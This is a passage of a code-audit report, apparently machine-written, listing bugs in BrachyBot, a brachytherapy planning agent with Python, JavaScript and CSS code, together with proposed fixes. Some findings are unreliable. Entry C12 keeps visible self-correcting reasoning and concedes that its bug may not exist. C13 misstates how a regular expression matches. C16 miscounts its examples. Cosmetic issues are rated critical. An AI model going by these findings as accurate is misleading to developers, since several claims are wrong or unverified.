**Impact:** Downstream consumers of tool results (report generation, UI display, conversation history) see "planning completed" attributed to the CTV segmentation step, which is misleading. If any downstream code decides whether to run additional steps based on `result.message`, it would skip planning because it already thinks it's done.

**Fix:** Do not mutate `result.message`. If planning completion needs to be communicated, add it to a different channel:
```python
# Store in a separate field or log entry:
self.memory.store("auto_planning_note", "Auto-completed after CTV segmentation")
```

---

## C9. `AgentMemory.clear_all_data` calls method that doesn't exist on `AgentMemory`

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/core.py` |
| **Line** | 532 |
| **Severity** | CRITICAL — crashes if called on bare AgentMemory instance |

**Problem:** `AgentMemory.clear_all_data()` calls `self._init_enhanced_integration()` — a method defined on `BrachyAgent`, not on `AgentMemory`. This "works" at runtime only because `AgentMemory` is composed into `BrachyAgent` which has this method. If `clear_all_data()` is ever called on a bare `AgentMemory` instance (e.g., in unit tests, or if someone refactors the composition), it crashes with `AttributeError`.

```python
# core.py:532
def clear_all_data(self):
    ...
    self._init_enhanced_integration()  # ← Only exists on BrachyAgent, not AgentMemory
```

**Impact:** Unit testing `AgentMemory` is impossible because `clear_all_data()` always crashes. Any future refactoring that changes the composition relationship will silently break this.

**Fix:** Remove the `_init_enhanced_integration` reference from `AgentMemory` and add a separate `post_clear` callback mechanism:
```python
# In AgentMemory:
def clear_all_data(self, post_clear_callback=None):
    ...
    if post_clear_callback:
        post_clear_callback()

# In BrachyAgent:
self.memory.clear_all_data(post_clear_callback=self._init_enhanced_integration)
```

---

## C10. Duplicate `ReportGeneratorTool` registration

| Field | Value |
|-------|-------|
| **File** | `AgenticSys.py` |
| **Line** | 572-575 AND 691-695 |
| **Severity** | CRITICAL — tool registered from two different import paths |

**Problem:** `ReportGeneratorTool` is imported from two different paths and registered twice:

```python
# Line 572-575:
from tool_factory.output.report_generator import ReportGeneratorTool
self.registry.register(ReportGeneratorTool())

# Line 691-695:
from tool_factory.report_generator import ReportGeneratorTool
self.registry.register(ReportGeneratorTool())
```

`ToolRegistry.register` uses `tool.name` as a dict key, so the second registration silently overwrites the first. If the two import paths resolve to different implementations (e.g., symlinks, different Python path), the first version is silently discarded.

**Impact:** Confusing which `ReportGeneratorTool` is actually registered. If a developer modifies one implementation but the other import resolves to a cached `.pyc`, stale behavior persists.

**Fix:** Keep only one registration:
```python
# Decide which import is canonical and remove the other.
# Also fix all other imports across the codebase to use the same path.
```

---

## C11. `loadDefaultParams` — `const setVal` redeclared violating TDZ

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-ui-api.js` |
| **Line** | 1089, 1103 |
| **Severity** | CRITICAL — throws `SyntaxError` on CT parameter loading |

**Problem:** Inside the `loadDefaultParams` function, `const setVal = ...` is declared at line 1089 and AGAIN at line 1103 in the SAME block scope (not in separate `if {}` blocks):

```javascript
// ui-api.js:1089 — inside `function loadDefaultParams()`:
    const setVal = (id, val) => { const el = document.getElementById(id); if (el) el.value = val; };

// ui-api.js:1103 — SAME function scope, NOT inside a nested block:
    const setVal = (id, val) => { ... };  // SyntaxError: Identifier 'setVal' has already been declared
```

JavaScript `const` does NOT allow redeclaration in the same block scope, even in sloppy mode. (`var` does, but `const` and `let` throw `SyntaxError`.)

**Impact:** When `loadDefaultParams` is called (every time CT data is loaded into the planning form), a `SyntaxError` is thrown. The function stops executing at line 1103, and planning parameters from the server defaults are NOT populated into the form. This means `seedCountMin`, `seedCountMax`, `inLowestEnergy`, and other critical planning parameters silently use their HTML defaults instead of server-provided defaults.

**Fix:** Change the second declaration to a simple assignment (no `const`), or extract the function once:
```javascript
const setVal = (id, val) => { const el = document.getElementById(id); if (el) el.value = val; };
// ... later, just call setVal():
setVal('inLowestEnergy', p.in_lowest_energy);  // NOT: const setVal = ...
```

---

## C12. `{current_date}` template variable never replaced in system prompt

| Field | Value |
|-------|-------|
| **File** | `config/prompts/system_prompt.md:2`, `config/prompts/__init__.py` |
| **Severity** | CRITICAL — LLM always sees literal `{current_date}` |

**Problem:** The system prompt template contains `Current date: {current_date}` (line 2). The `_load_prompt()` function in `__init__.py` reads the file content and returns it as-is — it does NOT call `.replace("{current_date}", ...)` or `str.format()`. The LLM receives the literal string `{current_date}` instead of an actual date.

```markdown
# system_prompt.md:2
Current date: {current_date}
```

```python
# __init__.py — _load_prompt() reads and returns raw string, NO replacement:
def _load_prompt() -> str:
    path = ... / "system_prompt.md"
    return path.read_text(encoding="utf-8")
```

The callers at `llm_runtime.py:171` use `SYSTEM_PROMPT_TEMPLATE.format(..., current_date=...)` but `SYSTEM_PROMPT_TEMPLATE` is the raw file content. So `format()` SHOULD replace `{current_date}`... BUT only if the full template is passed to `.format()` everywhere.

Wait — checking `__init__.py`: `SYSTEM_PROMPT_TEMPLATE` is indeed the raw file content loaded by `_load_prompt()`. And `llm_runtime.py:171` calls `.format(current_date=...)`. So `{current_date}` SHOULD be replaced in the main runtime paths. However, in `config/prompts/__init__.py`, `SYSTEM_PROMPT_TEMPLATE` is the raw content from the file WITHOUT any processing. The `format()` call at `llm_runtime.py:171` provides `current_date=datetime.datetime.now().strftime("%Y-%m-%d")`.

So actually this SHOULD work via the `.format()` call. BUT there's a risk: if any code path uses `SYSTEM_PROMPT_TEMPLATE` directly WITHOUT calling `.format()`, or if the `.format()` call omits `current_date` for any reason, the literal `{current_date}` leaks to the LLM.

Let me verify: is `SYSTEM_PROMPT_TEMPLATE` defined as a module-level constant that gets `.format()` called on it before use?

Actually the real issue is simpler — looking at the code more carefully: `SYSTEM_PROMPT_TEMPLATE` in `__init__.py` is the raw template string. The `.format()` is called at `llm_runtime.py:171`. But what if someone uses `SYSTEM_PROMPT_TEMPLATE` directly somewhere else?

The more likely bug: the `_load_prompt()` function returns the raw string, and if any caller forgets to call `.format()` with `current_date=...`, the LLM sees `{current_date}` verbatim. A defensive fix is to apply a safe default in the template loader itself.

**Impact:** If any code path misses the `.format()` call (and new code paths are added over time), or if the `current_date` parameter is omitted, the LLM receives literal `{current_date}` which may confuse it or cause it to fabricate a date.

**Fix:** Apply a safe default replacement in the `__init__.py` loader:
```python
SYSTEM_PROMPT_TEMPLATE = _load_prompt().replace(
    "{current_date}", datetime.now().strftime("%Y-%m-%d")
)
```

---

## C13. `_isFullPlan` operator precedence bug

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-chat-todo.js` |
| **Line** | 580-582 |
| **Severity** | CRITICAL — any message containing "规划" falsely triggers full plan mode |

**Problem:** The expression mixes `&&` and `||` without parentheses. In JavaScript, `&&` has higher precedence than `||`, so the logic evaluates incorrectly:

```javascript
const isFullPlan = /规划|execute|plan|运行|.../i.test(text)
    && /放射性|粒子|植入|.../i.test(text)
    || /规划/.test(text)         // ← Third term (AFTER &&, so || applies here)
    || /planning/i.test(text)
    || /规划/.test(text);        // ← Duplicate of /规划/
```

Due to precedence: `isFullPlan = (A && B) || C || D || C` where:
- A = broad execution keywords
- B = anatomy/disease keywords  
- C = `/规划/` test (any text with the character 规 or 划)
- D = `/planning/` test

The intent was `(A && B) || (C || D)`, but the actual evaluation `(A && B) || C || D || C` means that ANY text containing the single character "规" or "划" triggers full plan detection, even if the user is asking a knowledge question like "请解释治疗规划的基本原理" (Please explain the basic principles of treatment planning).

**Impact:** Many innocent Chinese sentences containing "规划" (planning) as a noun are misinterpreted as full-plan execution requests. The user asks for information, but the system runs a full treatment plan instead. This wastes compute time and frustrates the user.

**Fix:** Wrap the terms in proper precedence:
```javascript
const isFullPlan = (/规划|execute|plan|运行|.../i.test(text)
    && /放射性|粒子|植入|.../i.test(text))
    || /^规划$/i.test(text)
    || /^planning$/i.test(text);
```

---

## C14. `_isAdviceRequest` overly broad regex

| Field | Value |
|-------|-------|
| **File** | `web/app/static/js/brachybot-chat-todo.js` |
| **Line** | 697-700 |
| **Severity** | CRITICAL — normal messages mistakenly routed to advice generation |

**Problem:** The word "review" and "plan" appear in the advice-detection regex, but these are common words in normal conversation:

```javascript
return /(?:advice|suggest|review|improve|优化|建议|评价|哪里|怎么调|如何调整|详细建议|规划评价)/i.test(text || '')
    && /(?:plan|planning|dose|seed|needle|CTV|OAR|规划|剂量|粒子|穿刺针|靶区|危及器官)/i.test(text || '');
```

A user message like:
- "Let me review the CT images first" → matches "review" in group 1 and "CTV" in group 2 → triggers advice flow
- "I plan to upload the DICOM series" → matches "plan" in group 1 and "planning" in group 2 → triggers advice flow

**Impact:** Normal conversational messages about reviewing data or planning next steps are intercepted and routed to `requestPlanningAdvice()` which generates unsolicited plan feedback, confusing the user and potentially overwriting the conversation context.

**Fix:** Add more specific context checks (e.g., require "advice" or "review" to appear near a planning keyword within a short window, not just anywhere in the text):
```javascript
const text_lower = (text || '').toLowerCase();
const has_advice_keyword = /\b(advice|suggest|improve|评价|优化)\b/i.test(text_lower);
const has_plan_context = /\b(plan|dose|seed|CTV|OAR|剂量|粒子)\b/i.test(text_lower);
return has_advice_keyword && has_plan_context;
```

---

## C15. `/api/export/stl` saves `.npy` files, not STL

| Field | Value |
|-------|-------|
| **File** | `web/routes/planning_routes.py` |
| **Line** | 1564-1565 |
| **Severity** | CRITICAL — endpoint name completely misrepresents output format |

**Problem:** The endpoint `/api/export/stl` claims to export STL files (Standard Triangle Language, the standard 3D printing format), but the implementation saves NumPy `.npy` files:

```python
# planning_routes.py:1564-1565
np.save(os.path.join(safe_output_dir, f"seed_{i}_{j}_pos.npy"), pos)
np.save(os.path.join(safe_output_dir, f"seed_{i}_{j}_dir.npy"), direc)
```

The docstring says "Export seed positions as STL files" but the code doesn't use `numpy-stl`, `trimesh`, or any STL library. It saves raw NumPy arrays.

**Impact:** Any user or downstream tool expecting standard STL files receives unreadable `.npy` files. The endpoint is effectively useless for 3D printing or mesh viewing.

**Fix:** Rename the endpoint to `/api/export/seed_positions` or implement actual STL export:
```python
# Option A: rename
@app.route("/api/export/seed_positions", methods=["POST"])

# Option B: implement STL
from stl import mesh
stl_mesh = mesh.Mesh(np.zeros(len(points), dtype=mesh.Mesh.dtype))
for i, (pos, direc) in enumerate(zip(points, directions)):
    stl_mesh.vectors[i] = ...  # build triangular mesh for each seed
stl_mesh.save(os.path.join(safe_output_dir, "seeds.stl"))
```

---

## C16. `.step-num` class undefined in CSS — used 7 times in HTML

| Field | Value |
|-------|-------|
| **File** | `web/app/` HTML (7 occurrences) + all 4 CSS files |
| **Severity** | CRITICAL — step number badges render unstyled |

**Problem:** The HTML template uses `<span class="step-num">N</span>` in 7 places to show step numbers in the planning workflow tabs (e.g., `"0"` next to CTV Seg, `"1"` next to OAR Seg, etc.). However, no `.step-num` CSS class is defined in any of the 4 CSS files:

```html
<!-- HTML uses step-num in multiple places: -->
<span class="step-num">0</span> CTV Seg
<span class="step-num">1</span> OAR Seg
<span class="step-num">2</span> Trajectory Init
<span class="step-num">3</span> Seed Planning
<span class="step-num">4</span> Dose Calc
<span class="step-num">5</span> Dose Eval
```

These render as plain inline text with the browser's default font and size — no circular badge, no background, no proper alignment. They look like unformatted plain numbers, not step indicators.

**Impact:** The planning workflow visualization is broken — step numbers appear as unformatted text rather than the intended circular badge design. Users cannot easily distinguish step indicators from other text.

**Fix:** Add to any CSS file (e.g., `brachybot-panels-viewers.css`):
```css
.step-num {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: 20px;
    height: 20px;
    border-radius: 50%;
    background: var(--primary, #3b82f6);
    color: #fff;
    font-size: 0.7rem;
    font-weight: 700;
    margin-right: 4px;
}
```

---

## C17. Orphan CSS declaration after prematurely closed block

| Field | Value |
|-------|-------|
| **File** | `web/app/static/css/brachybot-chat-status.css` |
| **Line** | 1027-1032 |
| **Severity** | CRITICAL — CSS properties never applied |

**Problem:** A closing brace `}` at the end of line 1028 terminates the `.usage-value` block prematurely. The properties on lines 1029-1032 (`color: var(--primary); font-weight: 600; font-variant-numeric: tabular-nums; font-family: 'JetBrains Mono', monospace;`) become orphan declarations with no selector — the browser ignores them:

```css
/* Line 1027-1032 */
.usage-value {
    font-feature-settings: "tnum" 1;
}                              /* ← This brace closes .usage-value */
color: var(--primary);         /* ← ORPHAN — no selector */
font-weight: 600;              /* ← ORPHAN */
font-variant-numeric: tabular-nums;  /* ← ORPHAN */
font-family: 'JetBrains Mono', monospace;  /* ← ORPHAN */
}                              /* ← Unmatched closing brace */
```

**Impact:** The primary color and monospace font intended for `.usage-value` are never applied. Usage statistics in the status panel render in the default body font/color instead of the intended highlighted design.

**Fix:** Move the closing brace to after all declarations:
```css
.usage-value {
    font-feature-settings: "tnum" 1;
    color: var(--primary);
    font-weight: 600;
    font-variant-numeric: tabular-nums;
    font-family: 'JetBrains Mono', monospace;
}
```

---

## C18. `.metric-card.warn` duplicate `border` — warning border invisible

| Field | Value |
|-------|-------|
| **File** | `web/app/static/css/brachybot-panels-viewers.css` |
| **Line** | 499-500 |
| **Severity** | CRITICAL — warning state has no visible border |

**Problem:** The `.metric-card.warn` selector has `border` declared twice in the same block. The second declaration overrides the first, making the warning border transparent:

```css
/* panels-viewers.css:499-500 */
.metric-card.warn {
    background: rgba(245, 158, 11, 0.2);
    border: 1px solid rgba(245, 158, 11, 0.5);  /* ← Intended warn border (amber) */
    border: 1px solid transparent;                /* ← Overrides to invisible! */
    ...
}
```

Compare with `.metric-card.pass` (line 504-505) which correctly has `border: 1px solid rgba(16, 185, 129, 0.5)` — a single declaration.

**Impact:** When a clinical metric fails a warning threshold, the metric card shows only an amber background with NO colored border. The visual distinction between "pass" (green border), "warn" (should be amber border), and "fail" (red border) is lost for moderate warnings. The amber border is present in the source but invisible because `transparent` overrides it.

**Fix:** Remove the redundant `transparent` border:
```css
.metric-card.warn {
    background: rgba(245, 158, 11, 0.2);
    border: 1px solid rgba(245, 158, 11, 0.5);
    ...
}
```

---

# HIGH (22)

---

## H1. `_record_experience` crashes when `_init_self_evolution` fails

| Field | Value |
|-------|-------|
| **File** | `AgenticSys.py:420-432` (init), `agent_runtime/chat_workflows.py:1469` (usage) |
| **Severity** | HIGH — unhandled AttributeError breaks chat loop |

**Problem:** `_init_self_evolution()` sets `self.evolution_engine = None` before the try block. But the `except` handler (lines 431-432) only logs a warning and does NOT set `self.exp_memory = None`. If the import of `ExperienceMemory` fails (e.g., missing dependency, broken import), `self.exp_memory` attribute is never assigned to the instance.

```python
# AgenticSys.py:420-432
def _init_self_evolution(self):
    self.evolution_engine = None
    try:
        from memory import ExperienceMemory, SelfEvolutionEngine
        self.exp_memory = ExperienceMemory(session_id=self.memory.session_id)
        self.evolution_engine = SelfEvolutionEngine(experience_memory=self.exp_memory, ...)
    except Exception as e:
        logger.warning(f"Self-evolution system not available: {e}")
        # ← self.exp_memory is NEVER set here!
```

Then at `chat_workflows.py:1469`:
```python
def _record_experience(self, ...):
    if not self.exp_memory:     # ← AttributeError! self.exp_memory doesn't exist
        return
```

Compare with `get_status()` at line 1941 which correctly uses `getattr`:
```python
status["experiences"] = self.exp_memory.get_summary()
# ↓ is guarded:
if getattr(self, "exp_memory", None):
```

**Impact:** If the `memory` module import fails for any reason, every user message triggers `AttributeError` in `_record_experience`, breaking the chat loop entirely. Recovery requires server restart.

**Fix:** Add `self.exp_memory = None` in the except block:
```python
except Exception as e:
    logger.warning(f"Self-evolution system not available: {e}")
    self.exp_memory = None  # ← ADD THIS
```

---

## H2. Invalid CSS `font-family` syntax

| Field | Value |
|-------|-------|
| **File** | `web/app/static/css/brachybot-theme-layout.css` |
| **Line** | 396 |
| **Severity** | HIGH — lang-toggle buttons never use Inter font |

**Problem:** The `.lang-btn` rule wraps the entire font-family value including the comma and fallback in single quotes. CSS interprets this as a literal font name `Inter, sans-serif` (with comma), which never matches any installed font:

```css
/* Line 396 — WRONG */
.lang-btn {
    font-family: 'Inter, sans-serif';  /* Looks for font named "Inter, sans-serif" */
    ...
}
```

Compare with correct usage elsewhere in the same file:
```css
/* Line 254 — CORRECT */
font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;

/* Line 333 — CORRECT */
font-family: 'Space Grotesk', sans-serif;
```

**Impact:** The language toggle buttons (EN/中) inherit whatever font the parent element uses, instead of using `Inter` as intended. This is a visual inconsistency — the language toggle buttons don't match the typography of the rest of the header.

**Fix:** Move the quote before the comma:
```css
.lang-btn {
    font-family: 'Inter', sans-serif;
}
```

---

## H3. Missing `_cancelled()` check at streaming loop top

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py` |
| **Line** | 1286 |
| **Severity** | HIGH — user cancel ignored between LLM rounds |

**Problem:** The non-streaming `_run_llm_function_calling` checks `_cancelled()` at every iteration top (line 338). The streaming `_run_llm_function_calling_stream` starts its while loop at line 1286 WITHOUT this check — cancel is only checked inside the tool execution sub-loop (line 1541):

```python
# Non-stream (line 338) — checks cancel at loop top:
while not self._cancelled():
    ...

# Stream (line 1286) — NO cancel check at loop top:
while True:
    # ... the cancel check at line 1541 is inside the tool processing block,
    # NOT at the top of the LLM iteration loop
```

**Impact:** If a user clicks "Cancel" between LLM call rounds (after tool results return but before the next LLM call), the streaming version doesn't detect it and proceeds to call the LLM again. The user sees the system continuing despite their cancel request.

**Fix:** Add `if self._cancelled(): break` at the top of the streaming while loop:
```python
while True:
    if self._cancelled():
        logger.info("Stream cancelled by user")
        yield_event("done", {"final": str("Cancelled")})
        return
    ...
```

---

## H4. Inconsistent CT-loaded gate: stream vs non-stream

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py:438` vs `:1314-1316` |
| **Severity** | HIGH — stream version ignores CT in agent memory |

**Problem:** The non-streaming version checks TWO conditions: UI state AND agent memory:

```python
# Non-stream (line 438):
_no_files_loaded = not AgentMemory.is_ct_loaded(ui_state_for_override) and not _ct_in_memory
#                                      ↑ UI state check       ↑ agent memory check
```

The streaming version checks ONLY the UI state:

```python
# Stream (line 1314-1316):
ct_loaded = AgentMemory.is_ct_loaded(ui_state)
#           ↑ UI state check ONLY
```

`AgentMemory.is_ct_loaded()` only inspects the UI state object (derived from `conversation_state`), NOT `self.memory.retrieve("ct_image")`. If CT data is in agent memory but the UI state says not loaded (e.g., after a page refresh), the streaming version blocks CT-dependent tools while the non-streaming version allows them.

**Impact:** In streaming mode, after a page refresh, the system falsely believes no CT is loaded and prevents CT-related tool calls (segmentation, planning). The non-streaming path would correctly allow them because it also checks agent memory.

**Fix:** Mirror the non-streaming logic:
```python
ct_loaded = AgentMemory.is_ct_loaded(ui_state) or self.memory.retrieve("ct_image") is not None
```

---

## H5. Bare `except:` catches `KeyboardInterrupt` / `SystemExit`

| Field | Value |
|-------|-------|
| **File** | `AgenticSys.py` |
| **Line** | 1670 |
| **Severity** | HIGH — process cannot be killed with Ctrl+C during dict sanitization |

**Problem:** A bare `except:` without exception type catches all exceptions including `KeyboardInterrupt` and `SystemExit`. This makes the process unresponsive to Ctrl+C:

```python
# AgenticSys.py:1670
except:     # ← Bare except: catches KeyboardInterrupt and SystemExit
    sanitized[key] = f"<{type(value).__name__} with {len(value)} items>"
```

Python exceptions like `KeyboardInterrupt` and `SystemExit` should almost never be caught by bare `except:` clauses. They're intended to propagate and terminate the process.

**Impact:** If a user presses Ctrl+C while `_sanitize_for_json` is processing a large memory object (e.g., a large numpy array dump in the conversation), the process hangs because the bare except catches the interrupt. The user must use `kill -9` to terminate.

**Fix:** Use `except Exception:` instead:
```python
except Exception:
    sanitized[key] = f"<{type(value).__name__} with {len(value)} items>"
```

---

## H6. Inline path validation bypasses centralized `_validate_path`

| Field | Value |
|-------|-------|
| **File** | `web/server.py` |
| **Line** | 261-275 (`api_viewer_image`) |
| **Severity** | HIGH — env var expansion silently ignored for this endpoint |

**Problem:** `api_viewer_image` validates the path using a hardcoded `startswith` check instead of the shared `_validate_path()` function:

```python
# server.py:272-275 — inline validation, not _validate_path():
upload_dir = os.path.realpath(os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "uploads"
))
if not image_path.startswith(upload_dir + os.sep):
    return jsonify({"error": "Access denied"}), 403
```

This bypasses the `_validate_path` function in `server_support.py:879` which also checks:
- Resolved symlinks
- `BRACHYBOT_DATA_ROOTS` environment variable (allowing additional data directories)
- `..` path component traversal

**Impact:** Users who have configured `BRACHYBOT_DATA_ROOTS` to include directories outside the default `uploads/` path cannot use `api_viewer_image` to view images from those directories. All other endpoints respect this env var, but this one doesn't. This also means the path traversal protection is weaker — the inline check doesn't resolve symlinks.

**Fix:** Use the shared `_validate_path()` function:
```python
from web.server_support import _validate_path
...
if not _validate_path(image_path, purpose="read"):
    return jsonify({"error": "Access denied"}), 403
```

---

## H7. No 413 (Request Entity Too Large) JSON error handler

| Field | Value |
|-------|-------|
| **File** | `web/server.py:83` |
| **Severity** | HIGH — client gets HTML instead of JSON on large uploads |

**Problem:** `MAX_CONTENT_LENGTH = 500 * 1024 * 1024` (500MB) is set, but Flask's default 413 error handler returns an HTML page instead of JSON:

```python
# server.py:83
app.config["MAX_CONTENT_LENGTH"] = 500 * 1024 * 1024  # 500MB max upload
```

Flask's built-in 413 handler returns `text/html`:
```html
<!DOCTYPE HTML PUBLIC ...>
<title>413 Request Entity Too Large</title>
<h1>Request Entity Too Large</h1>
```

**Impact:** Any client sending a request larger than 500MB receives HTML instead of JSON, which breaks the frontend's JSON parsing (`r.json()` throws, the catch block shows a generic error instead of a meaningful message like "File too large").

**Fix:** Add a custom 413 error handler:
```python
@app.errorhandler(413)
def request_entity_too_large(e):
    return jsonify({"error": "File too large. Maximum upload size is 500MB."}), 413
```

---

## H8. `DOSE_SCALE = 120.0` defined 5× across the codebase

| Field | Value |
|-------|-------|
| **File** | `tool_factory/seed_plan/planning_pipeline.py` (4×), `web/server_support.py` (1×) |
| **Line** | 1249, 1383, 1431, 1488 (planning_pipeline), 70 (server_support) |
| **Severity** | HIGH — dose scale change requires 5 edits |

**Problem:** The magic number `120.0` (dose model output → Gy conversion factor) is copy-pasted in 5 separate locations:

```python
# planning_pipeline.py:1249
DOSE_SCALE = 120.0     # in method A

# planning_pipeline.py:1383
DOSE_SCALE = 120.0     # in method B (same value, different scope)

# planning_pipeline.py:1431
DOSE_SCALE = 120.0     # in method C

# planning_pipeline.py:1488
DOSE_SCALE = 120.0     # in method D

# server_support.py:70
DOSE_MODEL_SCALE_GY = 120.0  # web side
```

**Impact:** If the dose model calibration changes and `120.0` needs to be updated to a different scale, a developer must find and update all 5 locations. If even one is missed, some parts of the system will produce incorrect dose values while others are correct, leading to inconsistent clinical metrics.

**Fix:** Define the constant in one canonical location and import it everywhere else:
```python
# In config/__init__.py or dose_config.py:
DOSE_MODEL_SCALE_GY = 120.0

# In planning_pipeline.py:
from config import DOSE_MODEL_SCALE_GY

# In server_support.py:
from config import DOSE_MODEL_SCALE_GY
```

---

## H9. Missing `anthropic` SDK in `requirements.txt`

| Field | Value |
|-------|-------|
| **File** | `requirements.txt` |
| **Severity** | HIGH — Claude/Anthropic provider won't work on fresh install |

**Problem:** The code references Anthropic API environment variables:
```python
# brachybot.py:110-111
_anthropic_key = os.environ.get("ANTHROPIC_AUTH_TOKEN", "") or os.environ.get("ANTHROPIC_API_KEY", "")
```

And `brain/providers/` likely contains an Anthropic LLM provider. However, `requirements.txt` does not list `anthropic` (the official Anthropic Python SDK). A fresh `pip install -r requirements.txt` will not install the SDK needed for Anthropic/Claude model support.

Also missing from `requirements.txt`:
- `pytest-asyncio` (needed by all `async` tests)
- `python-multipart` (Flask may need this for file upload parsing)
- `playwright` (used by debug test scripts)

**Impact:** Developers who clone the repo and install dependencies via `requirements.txt` will find that Anthropic/Claude provider fails with `ModuleNotFoundError`, and `pytest` fails on async tests.

**Fix:** Add missing dependencies:
```
anthropic>=0.30.0
pytest-asyncio>=0.21.0
python-multipart>=0.0.6
```

---

## H10. Stale worktrees with divergent pre-modernization code

| Field | Value |
|-------|-------|
| **File** | `.claude/worktrees/benchmark-optimization/`, `datamind-report/`, `ui-design-fixes/` |
| **Severity** | HIGH — worktrees contain full old codebase copies |

**Problem:** Three worktrees exist under `.claude/worktrees/`, each containing a FULL copy of the pre-modularization codebase including:
- Old monolithic `AgenticSys.py` (8300+ lines)
- Old monolithic `web/server.py` (5100+ lines)
- Old monolithic `web/app/index.html` (24000+ lines)
- Duplicate copies of `tests/test_brain_system.py` and `conftest.py`

These copies can diverge from the main project. If someone runs tests in a worktree, they're testing the OLD architecture, not the new modularized code.

**Impact:** Developers may unknowingly work on or test against the old monolithic code. Divergent test results between worktree and main project can mask regressions. The worktree's stale import paths may cause confusion.

**Fix:** Either: (a) remove stale worktrees after confirming no in-progress work, or (b) update worktrees to reflect the new modular structure.

---

## H11. `_parse_tool_calls` — fragile single-quote substitution corrupts strings

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/chat_workflows.py` |
| **Line** | 73 |
| **Severity** | HIGH — JSON parsing fails for tool calls with apostrophes |

**Problem:** The code blindly replaces ALL single quotes with double quotes to convert Python-style dicts to JSON:

```python
# chat_workflows.py:73
raw = py_tool_use.group(0).replace("'", '"')
```

This corrupts any string that contains an apostrophe. For example, if the LLM emits:
```python
{'name': "user's input", 'args': '{"key": "value"}'}
```

After replacement:
```python
{"name": "user"s input", "args": "{"key": "value"}"}
```

This is invalid JSON — `user"s` is unquoted text after the internal quote, and the JSON-like string `{"key": "value"}` also has its quotes corrupted.

**Impact:** Any LLM tool call that includes an apostrophe in a parameter value (e.g., a patient name like "O'Brien", a clinical finding like "patient's response") will fail to parse. This causes the tool call to be silently dropped or raise `json.JSONDecodeError`. The LLM may not get feedback about why its tool call failed.

**Fix:** Use a more sophisticated approach that only replaces quote delimiters, not internal quotes:
```python
import ast
try:
    # Try parsing as Python dict literal first
    parsed = ast.literal_eval(raw)
    raw = json.dumps(parsed)
except (SyntaxError, ValueError):
    # Fall back to single-quote replacement with validation
    ...
```

---

## H12. `_clean_response_text` — dead condition and 3× redundant pattern

| Field | Value |
|-------|-------|
| **File** | `agent_runtime/llm_runtime.py:759-885` |
| **Severity** | HIGH — duplicate condition never true; same pattern matched 3× |

**Problem:** Two issues in `_clean_response_text`:

1. **Dead condition** (line 803-804):
```python
if response_text.startswith(" ") or ('tool_use' in stripped or 'tool_use' in stripped):
```
   The right side of the `or` is `'tool_use' in stripped OR 'tool_use' in stripped` — identical expressions. The second check is always redundant.

2. **Same pattern matched 3× with increasing greediness** (lines 812, 830, 835, 837, 839):
```python
# Line 812:    ```tool_call { ... }```
# Line 830:    ```tool_call(.*?)``` — non-greedy
# Line 835:    ```tool_call(.*)``` — greedy (subsumes lines 812 and 830)
# Line 837:    tool_use { ... }
# Line 839:    tool_use (.*?) — non-greedy
```

The greedy pattern at line 835 subsumes the non-greedy patterns at 812 and 830, making them unreachable dead code.

**Impact:** Code is confusing to read and maintain. If someone modifies the greedy pattern at line 835, they may not realize they also need to update the dead patterns at lines 812 and 830. The `or ... or ...` duplicate at 803-804 suggests a copy-paste error.

**Fix:** Remove the duplicate condition and consolidate the regex patterns:
```python
# Remove line 804 (duplicate 'tool_use' in stripped condition)
# Consolidate lines 812-839 into focused patterns:
CLEANUP_PATTERNS = [
    (r'```tool_call\s*\{(.*?)\}\s*```', r'\1'),  # tool_call block → content
    (r'tool_use\s*\{', '{'),                       # tool_use prefix → plain
]
for pattern, replacement in CLEANUP_PATTERNS:
    response_text = re.sub(pattern, replacement, response_text, flags=re.DOTALL)
```

---

## H13. Duplicate DICOM export endpoints — near-identical logic

| Field | Value |
|-------|-------|
| **File** | `web/routes/planning_routes.py` |
| **Line** | 1479 (`/api/export/dicom_rt`), 1742 (`/api/export/dicom`) |
| **Severity** | HIGH — same logic duplicated, maintenance risk |

**Problem:** Two endpoints with different paths but nearly identical DICOM-RT export logic:

| Aspect | `/api/export/dicom_rt` (line 1479) | `/api/export/dicom` (line 1742) |
|--------|-----------------------------------|--------------------------------|
| Path validation | Yes (`_validate_path`) | Only validates output dir |
| File structure | Output path from form data | Fixed `output/dicom_export/` |
| Registration | Via `register_planning_routes` | Directly in server.py's `create_app` |
| 3D viewer context | Passes `state.coronal/sagittal/axial` | All empty strings |

The second endpoint at line 1742 was likely created for a specific frontend workflow but duplicates ~60 lines of code from the first.

**Impact:** If a DICOM export bug is fixed in one endpoint, the fix must be manually applied to the other. The two will inevitably diverge over time. The second endpoint also doesn't validate input paths, so it may have weaker security.

**Fix:** Consolidate into one endpoint with optional parameters for the different behaviors:
```python
@app.route("/api/export/dicom", methods=["POST"])
def api_export_dicom():
    return _export_dicom(use_form_config=False)

@app.route("/api/export/dicom_rt", methods=["POST"])
def api_export_dicom_rt():
    return _export_dicom(use_form_config=True)

def _export_dicom(use_form_config: bool):
    # Common logic
```

---

## H14. `int16` overflow risk in CT data conversion

| Field | Value |
|-------|-------|
| **File** | `web/routes/viewer_routes.py` |
| **Line** | 280 |
| **Severity** | HIGH — HU values >32767 silently truncated |

**Problem:** CT data is cast to `np.int16` without clipping:

```python
# viewer_routes.py:280
ct_int16 = ct_data.astype(np.int16)
```

`np.int16` range is -32768 to 32767. Hounsfield units typically range from -1024 to ~3000, which fits. However:
- DICOM raw pixel values can be 12-bit or 16-bit unsigned (0-4095 or 0-65535)
- If the CT data contains raw pixel values (not yet converted to HU), values >32767 overflow to negative
- Some CT scanners use extended Hounsfield scales (e.g., for metal artifact reduction)

When `ct_int16` overflows:
- Value 32768 becomes -32768
- Value 40000 becomes -25536
- This creates severe image artifacts

**Impact:** CT images with raw pixel values >32767 will display with incorrect densities (bright structures appear dark due to overflow), potentially masking or simulating pathology.

**Fix:** Clip before casting:
```python
ct_int16 = np.clip(ct_data, -32768, 32767).astype(np.int16)
```
Or use `np.int32`:
```python
ct_int32 = ct_data.astype(np.int32)
```

---

## H15. `list.pop(0)` O(n) cache eviction — unnecessary latency under lock

| Field | Value |
|-------|-------|
